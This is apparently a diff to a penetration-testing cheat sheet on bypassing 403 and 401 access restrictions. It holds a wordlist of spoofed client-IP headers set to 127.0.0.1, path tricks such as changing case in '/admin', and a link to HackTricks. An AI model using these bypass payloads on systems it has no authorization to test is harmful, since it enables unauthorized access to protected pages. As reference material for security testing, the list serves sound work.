@@ -1,22 +1,23 @@
-### Adding X-Forwarded-Host Header
+### Header Injection
 ```
 X-Forwarded-Host: 127.0.0.1 >> 200 OK
 ```
 Try this wordlist:
 ```txt
-    X-Originating-IP: 127.0.0.1
-    X-Forwarded-For: 127.0.0.1
-    X-Forwarded: 127.0.0.1
-    Forwarded-For: 127.0.0.1
-    X-Remote-IP: 127.0.0.1
-    X-Remote-Addr: 127.0.0.1
-    X-ProxyUser-Ip: 127.0.0.1
-    X-Original-URL: 127.0.0.1
-    Client-IP: 127.0.0.1
-    True-Client-IP: 127.0.0.1
-    Cluster-Client-IP: 127.0.0.1
-    X-ProxyUser-Ip: 127.0.0.1
-    Host: localhost
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-URL: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+Host: localhost
 ```
 ### Exploiting Path Normalization
 ```
@@ -48,3 +49,7 @@ If it not works, try double encoding.
 /admin >> 403 Access Denied
 /admiN >> 200 OK
 ```
+
+## More Info
+
+[Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/403-and-401-bypasses.html)
